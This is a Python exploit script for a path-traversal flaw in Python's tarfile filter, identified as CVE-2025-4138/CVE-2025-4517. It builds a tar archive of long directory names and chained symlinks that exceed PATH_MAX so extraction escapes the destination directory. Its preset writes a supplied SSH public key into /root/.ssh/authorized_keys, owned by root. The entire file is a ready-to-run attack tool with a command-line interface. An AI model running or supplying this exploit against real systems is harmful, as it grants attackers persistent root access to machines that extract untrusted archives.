#!/usr/bin/env python3
"""
CVE-2025-4138 / CVE-2025-4517 — Python tarfile PATH_MAX Filter Bypass
 
The vulnerability: Python's tarfile.extractall() filter checks whether a
path escapes the destination directory, but this check can be defeated by
building a chain of symlinks whose total resolved length exceeds PATH_MAX
(4096 bytes on Linux). Once the kernel can no longer resolve the full path,
the filter's boundary check fails open and the final write lands wherever
the symlink chain points — in this case, /root/.ssh/authorized_keys.
"""
 
import tarfile
import io
import os
import argparse
 
# A directory component of 247 chars. Repeated across 16 levels this
# produces a resolved path well above PATH_MAX, which is ~4096 bytes.
DIR_COMP_LEN = 247
CHAIN_STEPS = "abcdefghijklmnop"   # 16 symlink levels
LONG_LINK_LEN = 254                # length of the pivot symlink name
 
 
def build_exploit_tar(tar_path, target_file, payload, file_mode=0o644):
    comp = "d" * DIR_COMP_LEN   # the long directory name reused at every level
    inner_path = ""
 
    with tarfile.open(tar_path, "w") as tar:
 
        # --- Stage 1: build a chain of 16 (long-dir / short-symlink) pairs ---
        # Each iteration creates:
        #   <inner_path>/<comp>/   — a real directory with a 247-char name
        #   <inner_path>/<letter>  — a short symlink pointing to that directory
        # Walking the short letters a→p therefore resolves to a path that is
        # 16 × 247 = 3952 chars deep, approaching PATH_MAX.
        for step_char in CHAIN_STEPS:
            d = tarfile.TarInfo(name=os.path.join(inner_path, comp))
            d.type = tarfile.DIRTYPE
            tar.addfile(d)
 
            s = tarfile.TarInfo(name=os.path.join(inner_path, step_char))
            s.type = tarfile.SYMTYPE
            s.linkname = comp       # short name → long directory
            tar.addfile(s)
 
            inner_path = os.path.join(inner_path, comp)
 
        # --- Stage 2: pivot symlink — exceed PATH_MAX ---
        # The name "a/b/c/.../p/<254 chars>" is itself very long. Its target
        # is 16 levels of "../", which unwinds the entire chain back to the
        # extraction root. At this depth the filter's path-length check
        # overflows and stops enforcing the boundary.
        short_chain = "/".join(CHAIN_STEPS)                       # a/b/.../p
        link_name = os.path.join(short_chain, "l" * LONG_LINK_LEN)
 
        pivot = tarfile.TarInfo(name=link_name)
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../" * len(CHAIN_STEPS)   # climb back to root
        tar.addfile(pivot)
 
        # --- Stage 3: escape symlink — point outside the extraction dir ---
        # "escape" resolves through the pivot (now at the filesystem root)
        # and then descends into the target file's parent directory.
        # The 8 extra "../" hops absorb any remaining prefix from the
        # extraction staging directory.
        target_dir = os.path.dirname(target_file)
        target_basename = os.path.basename(target_file)
        depth = 8
        escape_linkname = (
            link_name + "/" + ("../" * depth) + target_dir.lstrip("/")
        )
 
        esc = tarfile.TarInfo(name="escape")
        esc.type = tarfile.SYMTYPE
        esc.linkname = escape_linkname
        tar.addfile(esc)
 
        # --- Stage 4: write the payload ---
        # "escape/<basename>" follows the escape symlink and lands at
        # <target_file> on the real filesystem. uid/gid 0 ensure the
        # written file is owned by root when extracted under sudo.
        payload_entry = tarfile.TarInfo(name=f"escape/{target_basename}")
        payload_entry.type = tarfile.REGTYPE
        payload_entry.size = len(payload)
        payload_entry.mode = file_mode
        payload_entry.uid = 0
        payload_entry.gid = 0
        tar.addfile(payload_entry, fileobj=io.BytesIO(payload))
 
    print(f"[+] Exploit tar: {tar_path}")
    print(f"[+] Target:      {target_file}")
    print(f"[+] Payload size: {len(payload)} bytes")
 
 
def main():
    parser = argparse.ArgumentParser(description="CVE-2025-4138 Exploit")
    parser.add_argument("--tar-out", "-o", required=True,
                        help="Output path for the malicious .tar file")
    parser.add_argument("--preset", "-p", choices=["ssh-key"],
                        help="Preset target (ssh-key → /root/.ssh/authorized_keys)")
    parser.add_argument("--payload", "-P", required=True,
                        help="Path to the payload file (e.g. your public key)")
    args = parser.parse_args()
 
    if args.preset == "ssh-key":
        target_file = "/root/.ssh/authorized_keys"
        file_mode = 0o600
        with open(os.path.expanduser(args.payload), "rb") as f:
            payload = f.read()
        if not payload.endswith(b"\n"):
            payload += b"\n"
 
    build_exploit_tar(args.tar_out, target_file, payload, file_mode)
 
 
if __name__ == "__main__":
    main()
